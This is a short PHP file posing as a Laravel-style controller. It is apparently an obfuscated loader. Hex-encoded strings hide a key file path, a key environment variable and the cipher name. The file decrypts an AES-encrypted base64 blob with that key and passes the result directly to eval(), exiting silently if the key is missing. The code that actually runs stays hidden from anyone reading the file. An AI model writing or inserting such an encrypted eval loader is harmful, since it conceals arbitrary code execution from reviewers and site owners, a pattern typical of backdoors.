<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('U3jJOMfRY2Q0RFs/pECTJg==');

$c=base64_decode(

'F42Dg9hqf5OKEKasSfA7noTtjwAJ23dRFy/hKLlXWkXSLcS+D7fHvW81ALrAAcaSWSGq0SxI7XQo' .
'J5o0PNBNBFRm/r7WkpwEKQTMi4DZmuqaIq1XUc7ovTmtOrTd2ksYAvhDpIBS9tLAEhJkSUTE5DcP' .
'0UOLH+jBeuNBH+Py0VU1GHgyXrtrNbTCbmahUTWGkqdkEqwmZBbGBVY9ZhkptA4oPRqNyJE7lkpA' .
'xIBR30yJcfIoBpbKkS553PsESw1J'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

